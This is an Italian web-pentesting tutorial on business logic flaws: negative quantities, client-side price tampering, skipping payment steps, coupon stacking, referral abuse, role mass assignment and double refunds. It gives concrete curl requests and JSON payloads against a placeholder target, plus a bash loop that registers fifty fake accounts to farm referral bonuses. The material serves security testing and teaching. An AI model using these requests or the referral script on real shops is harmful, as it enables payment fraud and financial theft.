---
title: 'Business Logic Flaw: Cos’è e Come Trovarlo'
slug: business-logic-flaw
description: >-
  Scopri cos’è un business logic flaw e come individuarlo nel pentesting web:
  prezzi negativi, coupon abuse, step bypass e workflow flaws.
image: /business-logic-flaw.webp
draft: false
date: 2026-03-13T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - business-logic
---

Un **Business Logic Flaw** è una vulnerabilità nella logica applicativa — non nel codice tecnico. Non c'è SQL injection, non c'è XSS, non c'è buffer overflow. Il codice funziona esattamente come lo sviluppatore l'ha scritto. Il problema è che lo sviluppatore **non ha previsto un caso d'uso** che l'attaccante sfrutta.

Un e-commerce permette di inserire quantità negative nel carrello. Il codice calcola `prezzo × quantità` → con quantità -5, il totale diventa negativo → il sistema emette un **rimborso** invece di un addebito. Nessun bug tecnico — il codice moltiplica correttamente. Ma nessuno ha pensato ai numeri negativi.

Queste vulnerabilità sono le più difficili da trovare perché **nessun scanner automatico le rileva**. Richiedono comprensione del business, creatività, e la mentalità di chi chiede "cosa succede se faccio questa cosa al contrario, in un ordine diverso, o con un valore assurdo?".

Satellite della [guida pillar Misc & Infra Attacks](https://hackita.it/articoli/misc-infra-attacks-guida-completa). Vedi anche: [Race Condition](https://hackita.it/articoli/race-condition), [IDOR](https://hackita.it/articoli/idor).

Riferimenti: [PortSwigger Business Logic](https://portswigger.net/web-security/logic-flaws), [OWASP Business Logic Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/), [HackTricks Business Logic](https://book.hacktricks.wiki/en/pentesting-web/business-logic-vulnerabilities.html).

***

## Detection

### Step 1: Mappa Il Flusso Business

```bash
# Prima di cercare bug, capisci come funziona il business:
# 1. Registrazione → Profilo → Upgrade piano
# 2. Catalogo → Carrello → Coupon → Pagamento → Conferma → Spedizione
# 3. Referral → Invito → Registrazione invitato → Bonus
# 4. Wallet → Ricarica → Trasferimento → Prelievo

# Per ogni flusso, chiediti:
# - Cosa succede se salto uno step?
# - Cosa succede se inverto l'ordine?
# - Cosa succede se ripeto uno step?
# - Cosa succede con valori 0, -1, 999999999?
# - Cosa succede se cambio un parametro dopo il pagamento?
```

### Step 2: Testa I Boundary

```bash
# Per ogni input numerico nell'applicazione:
# Quantità: 0, -1, -1000, 0.5, 0.001, 999999999, 2147483647 (INT_MAX)
# Prezzo: 0, 0.01, -100, 99999999
# Importo trasferimento: 0, -500, saldo+1, saldo×2

# Per ogni input stringa con vincoli:
# Campo email: formato invalido, lunghezza massima, caratteri speciali
# Codice coupon: vuoto, già usato, scaduto, maiuscolo/minuscolo, con spazi
```

### Step 3: Intercetta E Manipola In Burp

```bash
# In Burp Proxy → intercetta ogni request del flusso di acquisto:
# 1. Aggiungi al carrello → il prezzo è nella request? Modificabile?
# 2. Applica coupon → il discount è calcolato client-side o server-side?
# 3. Checkout → il totale nella request corrisponde a quello calcolato?
# 4. Conferma → l'ordine ID è sequenziale? Prevedibile?

# Cerca discrepanze tra:
# - Cosa mostra il frontend
# - Cosa viene inviato nella request
# - Cosa salva il backend
```

### Step 4: Testa Workflow Non Lineari

```bash
# Il flusso previsto: Step1 → Step2 → Step3 → Step4
# Testa:
# Step1 → Step4 (salti Step2 e Step3)
# Step1 → Step2 → Step1 → Step3 → Step4 (ripeti Step1)
# Step4 direttamente (senza Step1-3)
# Step1 → Step3 → Step2 → Step4 (ordine invertito)

# In pratica:
curl -X POST "https://target.com/api/order/confirm" \
  -H "Cookie: session=abc" \
  -d '{"order_id": "12345"}'
# L'ordine si conferma senza pagamento? Senza indirizzo?
```

***

## Pattern 1 — Manipolazione Prezzo / Quantità

```bash
# === Quantità negativa ===
POST /api/cart/add {"product_id": 42, "quantity": -5}
# Subtotale: 999 × -5 = -4995 → il carrello ha un totale negativo
# Al checkout: il sistema accredita 4995€ invece di addebitare?

# === Prezzo nel body della request ===
POST /api/cart/add {"product_id": 42, "quantity": 1, "price": 0.01}
# Se il backend usa il prezzo dalla request invece che dal database → 0.01€!

# === Integer overflow ===
POST /api/cart/add {"product_id": 42, "quantity": 2147483647}
# 999 × 2147483647 = overflow su INT32 → il totale diventa negativo

# === Arrotondamento ===
POST /api/cart/add {"product_id": 42, "quantity": 1, "price": 99.999}
# 99.999 arrotondato a 99.99 dal sistema di pagamento
# 100.00 - 99.99 = 0.01€ di differenza per transazione
# × 100.000 transazioni = 1.000€ di profitto
# Salami attack: piccolissime differenze di arrotondamento accumulate

# === Cambio valuta ===
# Se l'app supporta più valute:
POST /api/cart/add {"product_id": 42, "currency": "VND"}
# Prezzo in VND (Vietnamese Dong) = 250.000 VND ≈ 9€
# Ma il sistema addebita 250.000 × rate EUR? O il valore numerico grezzo?
```

***

## Pattern 2 — Skip Di Step Obbligatori

```bash
# Flusso e-commerce:
# Step 1: Seleziona prodotto  → POST /api/order/items
# Step 2: Indirizzo           → POST /api/order/address
# Step 3: Spedizione          → POST /api/order/shipping
# Step 4: Pagamento           → POST /api/order/pay
# Step 5: Conferma            → POST /api/order/confirm

# Test: vai diretto allo Step 5:
curl -X POST "https://target.com/api/order/confirm" \
  -H "Cookie: session=abc123" \
  -d '{"order_id": "12345"}'
# Se risponde 200 → ordine confermato senza pagamento!

# Test: salta lo Step 3 (spedizione):
# Fai Step 1 → Step 2 → Step 4 → Step 5
# Spedizione gratuita perché mai selezionata?

# Test: ripeti Step 4 con importo diverso:
POST /api/order/pay {"amount": 0.01, "order_id": "12345"}
# Il backend verifica che l'importo pagato corrisponda al totale?
```

***

## Pattern 3 — Abuso Coupon / Sconto

```bash
# === Coupon stacking ===
POST /api/cart/apply-coupon {"code": "SCONTO20"}   # -20%
POST /api/cart/apply-coupon {"code": "BENVENUTO10"} # -10%
POST /api/cart/apply-coupon {"code": "SUMMER15"}    # -15%
# Il sistema accetta più coupon? Totale: 100% - 20% - 10% - 15% = 55%?

# === Coupon su prezzo scontato ===
# Prodotto: 100€ in saldo al 50% → 50€
# Coupon 20%: applicato su 50€ → 40€ (sconto totale 60%)

# === Coupon + gift card loop ===
# 1. Compra gift card da 100€ → applica coupon 20% → paga 80€
# 2. Riscatta gift card → saldo 100€
# 3. Profitto: 20€. Ripeti.

# === Coupon dopo pagamento ===
# Paga 100€ → poi applica coupon → il sistema ricalcola e rimborsa?

# === Case sensitivity ===
POST /api/cart/apply-coupon {"code": "sconto50"}    # lowercase
POST /api/cart/apply-coupon {"code": "SCONTO50"}    # uppercase
# Se entrambi funzionano → lo stesso coupon con case diverso = doppio uso?

# === Coupon scaduto con timestamp manipulation ===
# Se il frontend invia la data corrente:
POST /api/cart/apply-coupon {"code": "OLD50", "timestamp": "2025-01-01T00:00:00Z"}
# Il backend usa il timestamp del client per la verifica scadenza?
```

***

## Pattern 4 — Abuso Referral / Bonus

```bash
# "Invita un amico → ricevi 10€"

# Self-referral:
# 1. Crea account con email temporanea (guerrillamail, tempmail)
# 2. Registra l'account fake col tuo codice referral
# 3. Ricevi 10€. Ripeti con email diverse.

# Verifica i controlli:
# ☐ L'email deve essere verificata?
# ☐ Serve una transazione minima dall'invitato?
# ☐ Lo stesso IP/device può creare più account?
# ☐ Lo stesso numero di telefono è richiesto?
# ☐ User-agent/fingerprint controllati?

# Script automatico:
for i in $(seq 1 50); do
  email="fakuser${i}@tempmail.com"
  curl -s -X POST "https://target.com/api/register" \
    -d "{\"email\":\"$email\",\"password\":\"Test123!\",\"referral\":\"MY_CODE\"}"
  echo "[+] Registered $email with referral"
done
# 50 registrazioni × 10€ = 500€ di bonus
```

***

## Pattern 5 — Manipolazione Ruolo / Piano

```bash
# === Upgrade senza pagamento ===
PUT /api/account/plan {"plan": "enterprise"}
# Il backend verifica il pagamento? O accetta il campo?

# === Mass Assignment su ruolo ===
PUT /api/users/me {"name": "Mario", "role": "admin"}
# Il campo "role" è filtrabile? La v1 dell'API lo filtra?

# === Downgrade con accesso mantenuto ===
# Attiva trial Premium → accedi a tutte le feature → fai downgrade a Free
# Le feature premium sono ancora accessibili?
# I dati scaricati durante il trial restano disponibili?

# === Free tier abuse ===
# "Piano Free: 100 API call/mese"
# Il limite è hard (429 dopo 100) o soft (warning)?
# Crea 10 account Free → 1000 API call/mese gratis
```

***

## Pattern 6 — Manipolazione Stato Ordine

```bash
# === Rimborso doppio ===
POST /api/orders/12345/refund          # Rimborso 1 → 100€
POST /api/orders/12345/refund          # Rimborso 2 → altri 100€?
# Il sistema verifica che l'ordine sia già stato rimborsato?

# === Modifica ordine post-pagamento ===
# Paga ordine con prodotto da 10€
PUT /api/orders/12345 {"product_id": 999}   # Cambia a prodotto da 1000€
# Il sistema permette la modifica dopo il pagamento?

# === Annullamento parziale ===
# Ordine: 5 prodotti × 20€ = 100€. Paga 100€.
# Annulla 4 prodotti → rimborso 80€
# Il quinto viene spedito → pagato 20€ per un singolo prodotto
# Ma il prezzo singolo era 25€ (sconto volume) → hai pagato meno
```

***

## Output Reale

### Quantità Negativa

```bash
$ curl -s -X POST "https://target.com/api/cart/add" \
  -H "Cookie: session=abc123" \
  -d '{"product_id": 42, "quantity": -3}' | python3 -m json.tool

{"cart": {"items": [{"product":"Laptop","quantity":-3,"price":999,"subtotal":-2997}], "total":-2997.00}}

$ curl -s -X POST "https://target.com/api/order/pay" \
  -H "Cookie: session=abc123" \
  -d '{"payment_method": "wallet"}'

{"status": "success", "refunded": 2997.00, "wallet_balance": 3497.00}
# → 2997€ accreditati sul wallet da una quantità negativa!
```

### Skip Pagamento

```bash
$ curl -s -X POST "https://target.com/api/order/confirm" \
  -H "Cookie: session=abc123" -d '{"order_id": "12345"}'

{"status": "confirmed", "shipping": "in_progress"}
# → Ordine confermato e spedito SENZA pagamento!
```

***

## Workflow Operativo

**Step 1** → Mappa il flusso business completo (registrazione, acquisto, pagamento, rimborso, referral)

**Step 2** → Per ogni step: saltalo, ripetilo, invertilo

**Step 3** → Per ogni input numerico: 0, -1, 999999999, INT\_MAX, decimali

**Step 4** → Per ogni coupon/sconto: stacka, applica dopo pagamento, case diverso, loop con gift card

**Step 5** → Per ogni limite: superalo, aggiralo con account multipli

**Step 6** → Cerca discrepanze tra frontend, request, e backend (prezzi calcolati dove?)

***

## Caso Studio

**Settore:** Marketplace online, 50.000 venditori, 500.000 acquirenti.

Il carrello accettava quantità negative. Prodotto da 10€ con quantity 1 + prodotto da 1.000€ con quantity -1 → totale -990€. Checkout con "wallet balance" → 990€ accreditati. Il wallet era usabile per acquisti reali.

Il referral dava 5€ per ogni invitato. Nessuna verifica email, nessun limite IP, nessuna transazione minima. Script con email temporanee: 200 registrazioni in un'ora → 1.000€ di bonus.

**Zero exploit tecnici. Solo creatività nell'usare le funzionalità esistenti in modi non previsti.**

***

## FAQ

### Gli scanner automatici trovano i Business Logic Flaw?

No. Nessun scanner (Burp Scanner, Acunetix, Nessus, OWASP ZAP) può capire la logica del business. Questi bug richiedono un pentester che comprenda il flusso, i vincoli, e le aspettative dell'applicazione. È il tipo di vulnerabilità dove l'esperienza e la creatività umana fanno la differenza.

### Qual è la differenza tra Business Logic Flaw e Race Condition?

La Race Condition sfrutta il **timing** (request parallele che arrivano prima dell'update dello stato). Il Business Logic Flaw sfrutta la **logica** (un valore negativo, uno step saltato, un coupon stackato). Possono coesistere: un coupon monouso può essere sia vulnerabile a race condition (parallelo) che a logic flaw (case sensitivity).

### Come si riportano nei pentest?

Descrivi il **flusso atteso** vs il **flusso reale**. Calcola l'impatto finanziario concreto: "un attaccante può generare 500€/ora di bonus referral con email fake" è molto più convincente di "il referral non valida l'email". Includi un PoC replicabile.

### Sono comuni?

Molto. Ogni applicazione con un flusso di pagamento, coupon, referral, o gestione account ha potenziali logic flaw. La pressione per rilasciare feature velocemente fa sì che i casi limite ("e se la quantità è negativa?") non vengano testati.

***

## ✅ Checklist

```
DETECTION
☐ Flusso business completo mappato
☐ Ogni step testato: skip, ripeti, inverti ordine
☐ Input numerici boundary: 0, -1, INT_MAX, decimali
☐ Discrepanze frontend/request/backend cercate

PREZZO / QUANTITÀ
☐ Quantità negativa
☐ Quantità zero
☐ Prezzo modificabile dal client?
☐ Integer overflow
☐ Arrotondamento decimali
☐ Cambio valuta manipulation

WORKFLOW
☐ Step obbligatori saltabili?
☐ Ordine degli step invertibile?
☐ Step ripetibili? (doppio rimborso)
☐ Modifica post-pagamento?
☐ Importo pagamento verificato server-side?

COUPON / SCONTO
☐ Stacking coupon
☐ Coupon + prezzo scontato
☐ Coupon dopo pagamento
☐ Gift card + coupon loop
☐ Case sensitivity (SCONTO50 vs sconto50)
☐ Coupon scaduto con timestamp manipulation

REFERRAL / BONUS
☐ Self-referral con email fake
☐ Stesso IP/device → multipli account?
☐ Email verification obbligatoria?
☐ Transazione minima richiesta?

RUOLO / PIANO
☐ Upgrade senza pagamento
☐ Mass Assignment su role/plan
☐ Downgrade mantiene accesso premium?
☐ Limiti Free tier enforced?

STATO
☐ Doppio rimborso
☐ Modifica ordine post-pagamento
☐ Annullamento parziale → pricing corretto?
```

***

> Il tuo carrello accetta quantità negative? I coupon si accumulano? Lo step di pagamento è saltabile? [Penetration test HackIta](https://hackita.it/servizi). Dalla logica al danno finanziario: [formazione 1:1](https://hackita.it/formazione).
